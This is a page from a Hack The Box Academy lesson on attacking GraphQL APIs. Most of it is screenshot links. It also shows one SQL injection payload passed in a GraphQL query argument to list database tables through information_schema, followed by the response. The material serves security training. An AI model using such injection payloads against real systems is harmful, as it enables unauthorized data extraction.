<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/271/section/3154
// Platform Version: V1
// Module ID: 271
// Module Name: Attacking GraphQL
// Module Difficulty: Medium
// Section ID: 3154
// Section Title: Injection Attacks
// Page Title: Hack The Box - Academy
// Page Number: 04
-->

# Injection Attacks

**Module Name:** Attacking GraphQL **Page Number:** 04

#### 

#### ATTACKING GRAPHQL Mini-Module

# Injection Attacks

## SQL Injection

![https://academy.hackthebox.com/storage/modules/271/sqli_1.png](https://academy.hackthebox.com/storage/modules/271/sqli_1.png)

![https://academy.hackthebox.com/storage/modules/271/sqli_2.png](https://academy.hackthebox.com/storage/modules/271/sqli_2.png)

![https://academy.hackthebox.com/storage/modules/271/sqli_3.png](https://academy.hackthebox.com/storage/modules/271/sqli_3.png)

![https://academy.hackthebox.com/storage/modules/271/sqli_4.png](https://academy.hackthebox.com/storage/modules/271/sqli_4.png)

![https://academy.hackthebox.com/storage/modules/271/sqli_5.png](https://academy.hackthebox.com/storage/modules/271/sqli_5.png)

![https://academy.hackthebox.com/storage/modules/271/info_5.png](https://academy.hackthebox.com/storage/modules/271/info_5.png)

``` graphql
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
    username
  }
}
```

``` graphql
{
  "data": {
    "user": {
      "username": "user,secret,post"
    }
  }
}
```

## Cross-Site Scripting (XSS)

![https://academy.hackthebox.com/storage/modules/271/xss_1.png](https://academy.hackthebox.com/storage/modules/271/xss_1.png)

![https://academy.hackthebox.com/storage/modules/271/xss_2.png](https://academy.hackthebox.com/storage/modules/271/xss_2.png)

# 

# 

#### Questions

####